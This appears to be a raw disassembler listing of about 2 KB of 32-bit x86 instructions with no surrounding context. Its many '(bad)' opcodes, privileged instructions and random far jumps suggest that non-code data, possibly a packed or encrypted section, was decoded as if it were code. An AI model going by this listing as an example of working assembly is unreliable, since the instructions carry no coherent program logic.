  4473e0:	mov    esi,0xa92288b2
  4473e5:	dec    ebx
  4473e6:	sub    al,0x14
  4473e8:	lock cwde 
  4473ea:	aam    0x11
  4473ec:	xlat   BYTE PTR ds:[ebx]
  4473ed:	call   0x782d:0x293f2f34
  4473f4:	jp     0x44738b
  4473f6:	neg    BYTE PTR [edx+esi*4+0x78]
  4473fa:	push   esp
  4473fb:	ds or  dl,al
  4473fe:	sub    ecx,DWORD PTR [eax+0x52]
  447401:	sub    DWORD PTR [esi+edx*8-0x4b],edx
  447405:	inc    ebx
  447406:	hlt    
  447407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447408:	pop    ebp
  447409:	push   esi
  44740a:	mov    esp,0x1a369cba
  44740f:	aas    
  447410:	inc    eax
  447411:	ins    BYTE PTR es:[edi],dx
  447412:	ins    DWORD PTR es:[edi],dx
  447413:	sub    DWORD PTR [eax],edx
  447415:	mov    ecx,DWORD PTR [ebp+0x39]
  447418:	in     al,dx
  447419:	popa   
  44741a:	or     DWORD PTR [edi+0x4495a82e],ecx
  447420:	cwde   
  447421:	test   BYTE PTR [eax+0x7b],dl
  447424:	and    BYTE PTR [edx+ebp*2],dl
  447427:	(bad)  
  447428:	and    al,0xfe
  44742a:	add    BYTE PTR [edx],cl
  44742c:	and    DWORD PTR [edi+0xbd844ac],esp
  447432:	scas   eax,DWORD PTR es:[edi]
  447433:	lods   eax,DWORD PTR ds:[esi]
  447434:	pop    es
  447435:	js     0x44742f
  447437:	mov    al,ds:0x570b96b0
  44743c:	inc    esi
  44743d:	jnp    0x447460
  44743f:	ror    BYTE PTR [ecx-0x13],cl
  447442:	call   0xea5e42ef
  447447:	mov    al,ds:0xcc858d3e
  44744c:	(bad)  
  44744e:	icebp  
  44744f:	push   eax
  447450:	add    DWORD PTR [edx+eax*8],edi
  447453:	es cmp eax,0xe349a2cc
  447459:	xchg   ebx,eax
  44745a:	aad    0x14
  44745c:	or     DWORD PTR [esi],0x1b
  44745f:	iret   
  447460:	or     eax,0xde7a9ad0
  447465:	xor    DWORD PTR [ebx-0x58],ebx
  447468:	lock jo 0x4473f8
  44746b:	mov    WORD PTR ds:0x620e18a2,cs
  447471:	dec    esi
  447472:	enter  0x3ddc,0xa
  447476:	fmul   DWORD PTR [esp+ecx*8]
  447479:	repnz pop edx
  44747b:	bnd jmp 0x50652888
  447481:	test   BYTE PTR [eax+0x4c904b7c],bh
  447487:	repz dec ebp
  447489:	call   0x5044af77
  44748e:	mov    ds:0x1843c0fb,eax
  447493:	fnstsw WORD PTR [esi-0x637105e0]
  447499:	jl     0x44742b
  44749b:	cmc    
  44749c:	dec    eax
  44749d:	jo     0x44745d
  44749f:	add    DWORD PTR [edx-0x7],0x2f00214c
  4474a6:	sub    eax,0x4feaea0
  4474ab:	add    DWORD PTR [ebp+0x16a51676],eax
  4474b1:	and    eax,0xb416222a
  4474b6:	xor    al,0x6f
  4474b8:	call   0x4167dd59
  4474bd:	pop    DWORD PTR [ecx-0x352e8171]
  4474c3:	sahf   
  4474c4:	cwde   
  4474c5:	lea    ecx,[esi]
  4474c7:	and    BYTE PTR [eax-0x6784371f],dh
  4474cd:	loopne 0x447521
  4474cf:	xor    DWORD PTR [edi+ebx*8],0xfffffffc
  4474d3:	add    eax,0x703554
  4474d8:	push   ecx
  4474d9:	mov    al,0x0
  4474db:	or     bl,bh
  4474dd:	ins    DWORD PTR es:[edi],dx
  4474de:	add    BYTE PTR [eax-0xe],cl
  4474e1:	adc    DWORD PTR [ecx],eax
  4474e3:	push   eax
  4474e4:	sti    
  4474e5:	or     BYTE PTR [eax+esi*4+0x67],bl
  4474e9:	jmp    0x3ae2:0xb84ebb
  4474f0:	fs push ss
  4474f2:	in     al,dx
  4474f3:	fisub  DWORD PTR [ecx]
  4474f5:	inc    esp
  4474f6:	mov    ah,0xb8
  4474f8:	sub    BYTE PTR [edx],cl
  4474fa:	or     dh,cl
  4474fc:	xchg   esp,eax
  4474fd:	adc    esi,DWORD PTR [ebp+0x621b1867]
  447503:	out    dx,eax
  447504:	mov    dh,0x9e
  447506:	push   es
  447507:	and    al,cl
  447509:	jbe    0x447493
  44750b:	or     al,0x14
  44750d:	sub    BYTE PTR [edi],0x1a
  447510:	test   al,0x3e
  447512:	and    ebx,DWORD PTR [esi+0x86d78d]
  447518:	dec    ebx
  447519:	es and dl,dl
  44751c:	mov    eax,ds:0xce1b484b
  447521:	cli    
  447522:	dec    ebx
  447523:	cmp    al,0x40
  447525:	xchg   edi,eax
  447526:	mov    dl,0x76
  447528:	cmp    BYTE PTR [eax],cl
  44752a:	sbb    BYTE PTR [edi+0x33c3c0c1],al
  447530:	mov    eax,ds:0x56ce8645
  447535:	adc    al,0x68
  447537:	out    dx,al
  447538:	stos   BYTE PTR es:[edi],al
  447539:	pop    ebx
  44753a:	das    
  44753b:	ins    BYTE PTR es:[edi],dx
  44753c:	loopne 0x4474c5
  44753e:	xor    DWORD PTR [ecx+ebx*4+0x72],eax
  447542:	mov    dh,0x3a
  447544:	test   eax,0x8a68846b
  447549:	fst    st(3)
  44754b:	mov    bh,0xa8
  44754d:	xchg   edi,eax
  44754e:	inc    esi
  44754f:	ins    BYTE PTR es:[edi],dx
  447550:	pop    eax
  447551:	dec    edx
  447552:	lods   eax,DWORD PTR ds:[esi]
  447553:	or     BYTE PTR [edx],0x9e
  447556:	fs pusha 
  447558:	or     DWORD PTR [ecx+0x40],0x58f0ae92
  44755f:	push   edx
  447560:	push   0xb590e43b
  447565:	cmp    cl,dh
  447567:	stc    
  447568:	or     BYTE PTR [edi-0x329f897e],cl
  44756e:	lods   eax,DWORD PTR ds:[esi]
  44756f:	push   ss
  447570:	hlt    
  447571:	sub    eax,0x1670a828
  447576:	dec    esp
  447577:	jb     0x447503
  447579:	(bad)  
  44757a:	jmp    0x4310:0x3521aaf9
  447581:	push   edx
  447582:	dec    edx
  447583:	sbb    DWORD PTR [eax-0x21],ebp
  447586:	mov    ds:0xaa8c6eaa,al
  44758b:	xlat   BYTE PTR ds:[ebx]
  44758c:	jl     0x447607
  44758e:	and    BYTE PTR [ebx+0x3424e883],ah
  447594:	pusha  
  447595:	push   eax
  447596:	(bad)  
  447597:	add    ah,BYTE PTR [ecx]
  447599:	jo     0x44758d
  44759b:	inc    edx
  44759c:	mov    edx,0x5097bed8
  4475a1:	sub    eax,0x1ef299e1
  4475a6:	add    al,BYTE PTR [ebp+0x60]
  4475a9:	inc    ebp
  4475aa:	aam    0x3
  4475ac:	push   edx
  4475ad:	or     bl,BYTE PTR [edx+edx*4]
  4475b0:	dec    esp
  4475b1:	sbb    eax,ebp
  4475b3:	xchg   BYTE PTR [eax+0x4e],dl
  4475b6:	adc    DWORD PTR [esi+0x35],ebp
  4475b9:	hlt    
  4475ba:	mov    dl,dl
  4475bc:	addr16 push cs
  4475be:	sbb    al,0x81
  4475c0:	inc    eax
  4475c1:	pop    ds
  4475c2:	jecxz  0x447552
  4475c4:	and    al,0x3d
  4475c6:	mov    al,ds:0xb0daee86
  4475cb:	mov    ah,0x27
  4475cd:	or     DWORD PTR [eax-0x2b],ebx
  4475d0:	or     dh,BYTE PTR ds:0x369fe82a
  4475d6:	and    al,0x84
  4475d8:	dec    edi
  4475d9:	les    eax,FWORD PTR [edx-0x1bf3adb8]
  4475df:	fwait
  4475e0:	push   ds
  4475e1:	sub    ah,bh
  4475e3:	cwde   
  4475e4:	mov    ds:0x8e3e1a4a,eax
  4475e9:	fisub  WORD PTR [esi-0x1f942d31]
  4475ef:	add    BYTE PTR [ebp-0x37],dh
  4475f2:	jb     0x44757c
  4475f4:	hlt    
  4475f5:	mov    esp,0x6c402769
  4475fa:	sbb    eax,0x3f764590
  4475ff:	mov    cl,0x7e
  447601:	or     cl,BYTE PTR [ebx]
  447603:	pusha  
  447604:	sar    BYTE PTR [eax+edx*1-0x7e],cl
  447608:	iret   
  447609:	sti    
  44760a:	cmc    
  44760b:	fadd   st,st(6)
  44760d:	and    esp,eax
  44760f:	sbb    eax,0x7c402a59
  447614:	addr16 dec eax
  447616:	sbb    ebx,DWORD PTR [esi]
  447618:	dec    esi
  447619:	imul   edi,DWORD PTR [eax],0x15a8e47f
  44761f:	adc    eax,0x6f8ad64f
  447624:	adc    al,0xa4
  447626:	scas   al,BYTE PTR es:[edi]
  447627:	adc    bl,BYTE PTR [esi+0x23]
  44762a:	(bad)  
  44762b:	xchg   DWORD PTR [eax+0x3d4980d],eax
  447631:	cwde   
  447632:	xor    DWORD PTR [edx],ebp
  447634:	jmp    0x4360:0xa0a6dd19
  44763b:	out    0x1d,al
  44763d:	add    eax,0x60e64a62
  447642:	ins    BYTE PTR es:[edi],dx
  447643:	dec    esi
  447644:	retf   
  447645:	dec    eax
  447646:	lahf   
  447647:	mov    WORD PTR [edx-0x457621e1],es
  44764d:	dec    edx
  44764e:	and    ah,BYTE PTR [edi+ecx*2+0x4cba67c6]
  447655:	inc    ebp
  447656:	push   es
  447657:	mov    BYTE PTR [bp+di+0x3],cl
  44765b:	jecxz  0x447680
  44765d:	and    ah,BYTE PTR [edi]
  44765f:	cwde   
  447660:	aam    0xd2
  447662:	rol    BYTE PTR [edx-0x4567a7fe],0xba
  447669:	sbb    DWORD PTR [edi+ecx*1-0x5e],ebp
  44766d:	push   ds
  44766e:	test   al,0xd0
  447670:	xlat   BYTE PTR ds:[ebx]
  447671:	cli    
  447672:	or     al,BYTE PTR [esi-0x62]
  447675:	rol    DWORD PTR [eax-0x3b],cl
  447678:	and    ecx,DWORD PTR ds:0xa23af5e0
  44767e:	sti    
  44767f:	and    al,0xab
  447681:	ret    0xf0f4
  447684:	cwde   
  447685:	out    0xdb,al
  447687:	jl     0x4476d3
  447689:	shl    BYTE PTR [ebp+0x58],0xef
  44768d:	out    dx,al
  44768e:	cmp    bl,BYTE PTR [edx-0x4af684be]
  447694:	push   ss
  447695:	push   ss
  447696:	mov    edi,0x7cb635b4
  44769b:	jns    0x44763d
  44769d:	mov    edi,DWORD PTR [edx-0x36]
  4476a0:	pop    edx
  4476a1:	push   0xfffffff3
  4476a3:	mov    dh,0x42
  4476a5:	mov    ah,0xa2
  4476a7:	push   es
  4476a8:	push   ds
  4476a9:	mov    al,ds:0x3474e1a1
  4476ae:	and    eax,0x52d2525a
  4476b3:	jae    0x4476cf
  4476b5:	rcr    BYTE PTR [esi-0x2],0xba
  4476b9:	add    eax,0xf4b49a35
  4476be:	cwde   
  4476bf:	outs   dx,BYTE PTR ds:[esi]
  4476c0:	fdivr  QWORD PTR [edx*1-0x7579b0fb]
  4476c7:	dec    ecx
  4476c8:	nop
  4476c9:	sti    
  4476ca:	fs sub eax,0x8807db0a
  4476d0:	mov    ecx,0x97b2ceca
  4476d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4476d6:	cwde   
  4476d7:	test   al,0x82
  4476d9:	outs   dx,DWORD PTR ds:[esi]
  4476da:	inc    dx
  4476dc:	(bad)  
  4476dd:	ins    DWORD PTR es:[edi],dx
  4476de:	js     0x447725
  4476e0:	imul   esp,DWORD PTR [eax],0xc07d061d
  4476e6:	xchg   al,dl
  4476e8:	(bad)  ss:[eax-0x7]
  4476ec:	ja     0x44770a
  4476ee:	lods   al,BYTE PTR ds:[esi]
  4476ef:	push   edx
  4476f0:	or     cl,dl
  4476f2:	enter  0x6ea1,0x1b
  4476f6:	pop    edi
  4476f7:	mov    al,0x24
  4476f9:	cmp    al,0xa7
  4476fb:	retf   
  4476fc:	(bad)  
  4476fd:	(bad)  
  4476fe:	sahf   
  4476ff:	ins    BYTE PTR es:[edi],dx
  447700:	mul    DWORD PTR [eax+0x9b25e99]
  447706:	pop    ds
  447707:	mov    ds:0x5546e1b0,al
  44770c:	ret    0xd810
  44770f:	adc    ch,BYTE PTR [ecx-0x4c9fbc4b]
  447715:	inc    ebx
  447716:	cmp    ah,BYTE PTR [esi+0x27cc7b83]
  44771c:	sub    BYTE PTR [edx-0x4fef307c],dh
  447722:	call   0x16a8:0x81ceb273
  447729:	jle    0x44770e
  44772b:	adc    eax,0x16144562
  447730:	icebp  
  447731:	cdq    
  447732:	push   0x3f
  447734:	fs cld 
  447736:	sub    BYTE PTR [edx],ch
  447738:	pop    esp
  447739:	(bad)  
  44773b:	dec    edx
  44773c:	mov    dl,0x4a
  44773e:	test   DWORD PTR [esi-0x4e572dc3],esi
  447744:	mov    gs,WORD PTR [ebx-0x258f05b3]
  44774a:	arpl   bx,bp
  44774c:	xchg   ebp,eax
  44774d:	out    0xb5,al
  44774f:	jo     0x44777f
  447751:	pop    edi
  447752:	mov    edx,0x8f54b5e
  447757:	loop   0x44778c
  447759:	inc    edx
  44775a:	shl    DWORD PTR [ebx+0x55b039b2],1
  447760:	pop    eax
  447761:	daa    
  447762:	push   esp
  447763:	inc    ah
  447765:	loop   0x44773f
  447767:	jl     0x447763
  447769:	ficomp DWORD PTR [bp+si-0x6d83]
  44776e:	xchg   BYTE PTR [edi],bh
  447770:	cld    
  447771:	mov    BYTE PTR [esi],dl
  447773:	cmp    BYTE PTR [esi+0x62855d4b],0x3c
  44777a:	push   ebx
  44777b:	or     ch,BYTE PTR [ecx-0x30]
  44777e:	push   ecx
  44777f:	test   BYTE PTR [ebx+0x4f708ed8],0xf4
  447786:	mov    edi,0xd24cf819
  44778b:	les    eax,FWORD PTR [eax-0x25]
  44778e:	mov    gs,WORD PTR [ebp+0x22dfd03b]
  447794:	jg     0x4477d8
  447796:	sub    bl,0x82
  447799:	shl    ah,1
  44779b:	xchg   ebx,eax
  44779c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44779d:	sbb    eax,0x484d14f9
  4477a2:	js     0x4477a4
  4477a4:	jge    0x447806
  4477a6:	or     ecx,0xfe79a2e
  4477ac:	and    al,0xa
  4477ae:	push   ds
  4477af:	cs adc eax,0x64338a8e
  4477b5:	aam    0x61
  4477b7:	mov    esp,0xa2a88596
  4477bc:	inc    edi
  4477bd:	arpl   WORD PTR [ebx+0x4f],cx
  4477c0:	fidivr DWORD PTR [esi-0x6b9b9e58]
  4477c6:	inc    ecx
  4477c7:	fs lahf 
  4477c9:	ins    DWORD PTR es:[edi],dx
  4477ca:	and    dl,BYTE PTR [ecx+0x6]
  4477cd:	xchg   esi,eax
  4477ce:	pop    eax
  4477cf:	jo     0x4477f1
  4477d1:	lock inc edi
  4477d3:	inc    edx
  4477d4:	invd   
  4477d6:	in     al,0x16
  4477d8:	pop    es
  4477d9:	fsub   st,st(3)
  4477db:	add    dl,al
  4477dd:	stos   BYTE PTR es:[edi],al
  4477de:	out    dx,eax
  4477df:	and    al,0xcc
  4477e1:	mov    esi,0x6a280b0e
  4477e6:	adc    ebp,DWORD PTR [ecx-0x5feb1e1c]
  4477ec:	stc    
  4477ed:	adc    bl,BYTE PTR [edx]
  4477ef:	(bad)  
  4477f0:	adc    bh,dl
  4477f2:	pop    esp
  4477f3:	jns    0x44784e
  4477f5:	xor    BYTE PTR ds:0x4cad1b74,ch
  4477fb:	sub    eax,0xbaa6688
  447800:	jno    0x447847
  447802:	mov    ds:0x14cba5b3,al
  447807:	sbb    eax,esp
  447809:	xchg   edx,eax
  44780a:	push   esi
  44780b:	mov    ch,0x3c
  44780d:	push   0x2
  44780f:	inc    edi
  447810:	pop    ss
  447811:	mov    eax,ds:0x2e9e28cd
  447816:	xchg   DWORD PTR [ebx+0x56],esp
  447819:	jp     0x447867
  44781b:	pusha  
  44781c:	lds    edi,FWORD PTR [edi]
  44781e:	cli    
  44781f:	dec    edx
  447820:	mov    ebx,0x344fd922
  447825:	sar    BYTE PTR [esi],1
  447827:	rol    DWORD PTR [esi],0x1
  44782a:	enter  0x7fdc,0x2d
  44782e:	adc    dl,BYTE PTR [ebx]
  447830:	iret   
  447831:	mov    BYTE PTR [ebp+0x18],dh
  447834:	sahf   
  447835:	xor    BYTE PTR [esi],dh
  447837:	push   esp
  447838:	lds    esi,FWORD PTR [esi+0x10]
  44783b:	es enter 0x47a0,0x5f
  447840:	cs dec edi
  447842:	push   ebx
  447843:	js     0x4477c6
  447845:	inc    edi
  447846:	fs jge 0x447803
  447849:	xchg   edx,eax
  44784a:	shl    DWORD PTR [ebp-0x1ebfbefc],1
  447850:	push   cs
  447851:	and    DWORD PTR [ecx+edi*2+0x60d586bb],esi
  447858:	inc    ecx
  447859:	lock aam 0xa6
  44785c:	dec    ebp
  44785d:	cwde   
  44785e:	add    BYTE PTR [esi],al
  447860:	aam    0x21
  447862:	mov    ah,0xab
  447864:	dec    edi
  447865:	mov    WORD PTR [ebx],fs
  447867:	fs out 0x3b,al
  44786a:	sub    DWORD PTR [edi],0x200ea84b
  447870:	mov    al,ds:0xb6537263
  447875:	mov    DWORD PTR [eax+eax*2],edx
  447878:	inc    esp
  447879:	repz push ss
  44787b:	es jp  0x4478eb
  44787e:	mov    eax,ds:0x36186ad1
  447883:	aad    0x49
  447885:	stos   DWORD PTR es:[edi],eax
  447886:	xor    eax,0xb300917c
  44788b:	ret    0xc49a
  44788e:	jecxz  0x447897
  447890:	ss mov al,0xa2
  447893:	pop    esp
  447894:	pushf  
  447895:	call   0x5eae9085
  44789a:	xchg   ebp,eax
  44789b:	rol    BYTE PTR [ecx],0x8c
  44789e:	xchg   edi,eax
  44789f:	cld    
  4478a0:	sahf   
  4478a1:	xor    al,0xe8
  4478a3:	retf   0x5d49
  4478a6:	or     ebx,DWORD PTR [esp+edi*4+0x48]
  4478aa:	cmp    al,0xb0
  4478ac:	sub    DWORD PTR [esi-0x2c],0x40afac43
  4478b3:	das    
  4478b4:	add    BYTE PTR [edi],bl
  4478b6:	and    BYTE PTR [eax+0x491a4493],cl
  4478bc:	mov    edx,0xca182d0
  4478c1:	xchg   edx,eax
  4478c2:	mov    al,ds:0x9ed52cfa
  4478c7:	sub    BYTE PTR [edx+eiz*4-0x77],dl
  4478cb:	mov    esi,0xa8de64f9
  4478d0:	or     BYTE PTR [ebx-0x80],ch
  4478d3:	or     ch,BYTE PTR [edi+0x22]
  4478d6:	fidiv  WORD PTR [ecx]
  4478d8:	aad    0xaa
  4478da:	add    al,0xe6
  4478dc:	xchg   ecx,eax
  4478dd:	shl    BYTE PTR [ecx],1
  4478df:	ret    0xc0c1
  4478e2:	sub    ebp,ecx
  4478e4:	rcr    DWORD PTR [ebx],0x4e
  4478e7:	jmp    0x87a6a86c
  4478ec:	neg    dl
  4478ee:	mov    edx,0xd510b686
  4478f3:	dec    esi
  4478f4:	sbb    ch,BYTE PTR ss:[ebp+0x7b]
  4478f8:	mov    al,0xda
  4478fa:	in     al,dx
  4478fb:	xchg   esp,eax
  4478fc:	mov    esi,0x5eefc0e6
  447901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447902:	aaa    
  447903:	sub    BYTE PTR [esi+ecx*2],al
  447906:	inc    edx
  447907:	add    ebx,DWORD PTR [bx+si-0x2ac6]
  44790c:	pop    esi
  44790d:	fcmovnb st,st(0)
  44790f:	aad    0xe3
  447911:	inc    BYTE PTR [ebp-0x72d14d27]
  447917:	lods   eax,DWORD PTR ds:[esi]
  447918:	mov    eax,ds:0xd96a98c2
  44791d:	dec    edx
  44791e:	jle    0x447990
  447920:	xchg   esp,eax
  447921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447922:	sub    DWORD PTR [edx-0x13],0xaa28eaa3
  447929:	push   ss
  44792a:	fsubr  QWORD PTR [ebx+ebx*4-0x1fd1a4ba]
  447931:	lods   al,BYTE PTR ds:[esi]
  447932:	outs   dx,BYTE PTR ds:[esi]
  447933:	sub    BYTE PTR [eax],bh
  447935:	das    
  447936:	ins    BYTE PTR es:[edi],dx
  447937:	ins    BYTE PTR es:[edi],dx
  447938:	adc    eax,0xdfee390a
  44793d:	iret   
  44793e:	jl     0x4478de
  447940:	and    BYTE PTR [edx],0x9a
  447943:	mov    al,ds:0x7af9515e
  447948:	(bad)  
  447949:	push   0xd04f1d15
  44794e:	das    
  44794f:	js     0x4479b2
  447951:	sbb    al,0x81
  447953:	call   0xaa6a:0xa85354df
  44795a:	cli    
  44795b:	adc    dl,BYTE PTR [eax]
  44795d:	fs xchg ebp,eax
  44795f:	push   0xd6478ab5
  447964:	in     eax,dx
  447965:	mov    BYTE PTR [esi+ebp*1],ah
  447968:	sub    eax,0x4d81947c
  44796d:	mov    al,0x28
  44796f:	aaa    
  447970:	push   ebp
  447971:	(bad)  
  447972:	mov    dh,0xfd
  447974:	outs   dx,DWORD PTR ds:[esi]
  447975:	sbb    cl,BYTE PTR [edi-0x72d167f4]
  44797b:	cmp    cl,BYTE PTR [edx]
  44797d:	mov    ch,BYTE PTR [eax]
  44797f:	fldenv [edx-0x12dd2987]
  447985:	and    al,0x13
  447987:	lods   al,BYTE PTR ds:[esi]
  447988:	xor    BYTE PTR [eax-0x80],0xf0
  44798c:	bound  edx,QWORD PTR [eax+0x3b]
  44798f:	sub    bl,ch
  447991:	add    esp,DWORD PTR [eax+eax*2]
  447994:	shr    edi,cl
  447996:	dec    ecx
  447997:	or     ah,dl
  447999:	jo     0x44795d
  44799b:	mov    bl,0xc2
  44799d:	in     al,dx
  44799e:	add    bl,ch
  4479a0:	sbb    al,BYTE PTR [edx+ebx*4]
  4479a3:	dec    esp
  4479a4:	sub    eax,0x8d0086c
  4479a9:	push   0xf5e1222
  4479ae:	pop    ecx
  4479af:	mov    eax,0xa625dadb
  4479b4:	jb     0x4479a8
  4479b6:	mov    edi,0xda887cb
  4479bb:	ds add al,0xf2
  4479be:	aas    
  4479bf:	int    0x10
  4479c1:	stos   BYTE PTR es:[edi],al
  4479c2:	clc    
  4479c3:	enter  0xa342,0xda
  4479c7:	aam    0xca
  4479c9:	mov    esp,DWORD PTR [esi-0x6a]
  4479cc:	mov    BYTE PTR [ecx+0x16],dh
  4479cf:	push   ds
  4479d0:	into   
  4479d1:	les    ecx,FWORD PTR [edx+0x40665848]
  4479d7:	or     bl,BYTE PTR [ebp+0x46]
  4479da:	push   esi
  4479db:	inc    esi
  4479dc:	inc    esi
  4479dd:	sub    dl,ch
  4479df:	and    eax,0x5d620c8c
  4479e4:	mov    cl,0xf1
  4479e6:	ret    0xf0da
  4479e9:	clc    
  4479ea:	xchg   edx,ebx
  4479ec:	lds    esi,FWORD PTR [edi+0x781aa30e]
  4479f2:	or     al,0xeb
  4479f4:	mov    ds:0xfe9218e6,eax
  4479f9:	fidiv  WORD PTR [esi-0x77]
  4479fc:	sub    al,0x34
  4479fe:	xor    al,0xf1
  447a00:	pop    esp
  447a01:	loopne 0x447a73
  447a03:	mov    eax,0xa20d5422
  447a08:	(bad)  
  447a09:	ror    DWORD PTR [esi],cl
  447a0b:	fistp  DWORD PTR [edx+0x12ba43ac]
  447a11:	stos   DWORD PTR es:[edi],eax
  447a12:	test   al,0x2c
  447a14:	loop   0x447a44
  447a16:	dec    esi
  447a17:	sbb    dh,BYTE PTR [eax-0x68]
  447a1a:	sbb    al,BYTE PTR [edx]
  447a1c:	iret   
  447a1d:	mov    BYTE PTR [edx-0x4],ah
  447a20:	les    ecx,FWORD PTR [esi+0x301bfe6f]
  447a26:	in     al,dx
  447a27:	jae    0x4479fd
  447a29:	call   FWORD PTR [ebp+0x68]
  447a2c:	add    ecx,DWORD PTR [edi]
  447a2e:	or     eax,0x4cffcfa
  447a33:	pop    esi
  447a34:	add    al,bh
  447a36:	xor    al,0x47
  447a38:	(bad)  
  447a39:	adc    BYTE PTR [esi-0x776c1fc5],ah
  447a3f:	iret   
  447a40:	test   BYTE PTR [esi],ch
  447a42:	enter  0xe42e,0x9d
  447a46:	fsub   DWORD PTR [ecx]
  447a48:	sub    eax,0x74f6da21
  447a4d:	and    BYTE PTR [ecx-0x5d27e38b],0x1d
  447a54:	test   cl,cl
  447a56:	mov    eax,0xbda1117e
  447a5b:	and    BYTE PTR [ecx],dl
  447a5d:	xchg   ecx,eax
  447a5e:	aam    0xd4
  447a60:	push   edi
  447a61:	or     DWORD PTR [edx-0x3a],0x1a
  447a65:	aam    0x1a
  447a67:	mov    gs,WORD PTR [edx+0x5b66aec0]
  447a6d:	cmp    BYTE PTR [esp+esi*8],al
  447a70:	jmp    0xcb28:0x7a56704c
  447a77:	push   ss
  447a78:	adc    eax,0xcec0805d
  447a7d:	mov    dh,0xf2
  447a7f:	jp     0x447a1f
  447a81:	imul   ebp,ebp,0xffffff86
  447a84:	je     0x447a0c
  447a86:	cmp    al,0x4
  447a88:	stc    
  447a89:	hlt    
  447a8a:	adc    eax,0xeea8470b
  447a8f:	js     0x447a19
  447a91:	(bad)  
  447a92:	fsubr  st(2),st
  447a94:	and    ebp,DWORD PTR [edx]
  447a96:	and    eax,0x7e85798
  447a9b:	add    al,0x76
  447a9d:	sbb    ah,dh
  447a9f:	sub    al,0xda
  447aa1:	mov    ch,0x74
  447aa3:	push   ds
  447aa4:	mov    edi,0xe39a001
  447aa9:	adc    al,0xe
  447aab:	jp     0x447a59
  447aad:	xlat   BYTE PTR ds:[ebx]
  447aae:	dec    ecx
  447aaf:	mov    eax,ds:0x4cba8418
  447ab4:	sub    ah,BYTE PTR [eax]
  447ab6:	pop    edx
  447ab7:	shl    DWORD PTR [esi-0x6e],0x40
  447abb:	hlt    
  447abc:	or     dh,cl
  447abe:	sbb    BYTE PTR ss:[ebx+esi*2-0x3],cl
  447ac3:	adc    dh,al
  447ac5:	pop    ecx
  447ac6:	push   esp
  447ac7:	loop   0x447aa0
  447ac9:	mov    al,ds:0x9f425c7a
  447ace:	and    eax,0xd00546a0
  447ad3:	push   ebx
  447ad4:	push   ebp
  447ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447ad6:	dec    edi
  447ad7:	mov    BYTE PTR [edi],0xf2
  447ada:	add    edx,DWORD PTR [esi-0x6de65c76]
  447ae0:	fs mov ah,0x3e
  447ae3:	jmp    0xa48a:0xd486463a
  447aea:	push   esp
  447aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447aec:	sub    eax,0x53434382
  447af1:	enter  0x74ba,0xfd
  447af5:	repnz mov dl,0xd5
  447af8:	je     0x447ab5
  447afa:	lods   al,BYTE PTR ds:[esi]
  447afb:	dec    edx
  447afc:	push   esp
  447afd:	shl    DWORD PTR [esi-0x48b5a7a0],1
  447b03:	mov    esp,0x4b23b502
  447b08:	add    BYTE PTR [ebp-0x766fbf2a],cl
  447b0e:	outs   dx,BYTE PTR ds:[esi]
  447b0f:	add    BYTE PTR ds:0x5f0cc17e,al
  447b15:	(bad)  
  447b17:	in     eax,dx
  447b18:	mov    bh,0xa
  447b1a:	cmp    DWORD PTR [ebx],0xffffffa6
  447b1d:	vpsllvd xmm2{k1}{z},xmm3,xmm4
  447b23:	sar    BYTE PTR [ebp+0x70],1
  447b26:	adc    ecx,DWORD PTR [eax+ebp*8-0x1d90a4aa]
  447b2d:	gs or  ebx,eax
  447b30:	push   cs
  447b31:	aam    0xd6
  447b33:	loope  0x447b5c
  447b35:	lods   al,BYTE PTR ds:[esi]
  447b36:	int    0x16
  447b38:	les    ebx,FWORD PTR [edi+0x1deca297]
  447b3e:	loopne 0x447b19
  447b40:	js     0x447b66
  447b42:	js     0x447acb
  447b44:	and    eax,0x8fb56d8e
  447b49:	adc    dh,BYTE PTR [eax-0x253d50b2]
  447b4f:	test   edx,esp
  447b51:	mov    ss,WORD PTR ds:0x704082cc
  447b57:	xchg   edx,eax
  447b58:	cmp    ah,0xb6
  447b5b:	pop    ebp
  447b5c:	adc    dl,bl
  447b5e:	mov    esi,0x4f94af0d
  447b63:	jbe    0x447b8e
  447b65:	(bad)  
  447b68:	aaa    
  447b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447b6a:	or     eax,0xd64d78ce
  447b6f:	ds cli 
  447b71:	js     0x447b33
  447b73:	dec    edi
  447b74:	dec    ecx
  447b75:	mov    ebp,DWORD PTR [esi-0x56]
  447b78:	jo     0x447b56
  447b7a:	xchg   edi,eax
  447b7b:	sbb    eax,0x43ed6c05
  447b80:	outs   dx,BYTE PTR ds:[esi]
  447b81:	adc    eax,0x7a769fa0
  447b86:	cmp    bh,BYTE PTR [edx-0x414a3ca6]
  447b8c:	inc    ebp
  447b8d:	and    BYTE PTR [ebx],bh
  447b8f:	retf   0x80b8
  447b92:	test   BYTE PTR [esi-0x5b7cf92c],al
  447b98:	and    al,ah
  447b9a:	hlt    
  447b9b:	mov    ds:0x149588b1,al
  447ba0:	stos   BYTE PTR es:[edi],al
  447ba1:	sub    eax,0x1604de7e
  447ba6:	jl     0x447b89
  447ba8:	push   ebx
  447ba9:	add    al,BYTE PTR [eax]
  447bab:	loope  0x447bf5
  447bad:	xor    dl,dl
  447baf:	sti    
  447bb0:	(bad)  
  447bb1:	in     eax,dx
  447bb2:	ret    0xf7c6
  447bb5:	and    dl,BYTE PTR [edx]
  447bb7:	adc    BYTE PTR [eax+0x1f],dh
  447bba:	loopne 0x447bcc
  447bbc:	xchg   edx,eax
  447bbd:	lock dec ecx
  447bbf:	push   edx
  447bc0:	in     al,dx
  447bc1:	mov    al,ds:0x73478d70
  447bc6:	mov    edi,DWORD PTR [eax+0x74]
  447bc9:	inc    esi
  447bca:	ror    BYTE PTR [edx],0xd9
  447bcd:	imul   BYTE PTR [eax+eax*1]
  447bd0:	stos   DWORD PTR es:[edi],eax
  447bd1:	pop    edx
  447bd2:	mov    eax,DWORD PTR [eax-0xc]
  447bd5:	push   esp
  447bd6:	fidiv  WORD PTR [ebp+ecx*1-0x4c]
  447bda:	add    al,0x78
  447bdc:	xor    BYTE PTR [edx+0x5ac2be47],ah
  447be2:	add    DWORD PTR [ebx-0x79],esp
  447be5:	imul   edi,DWORD PTR [esi+0x23856655],0xf85a4bc4
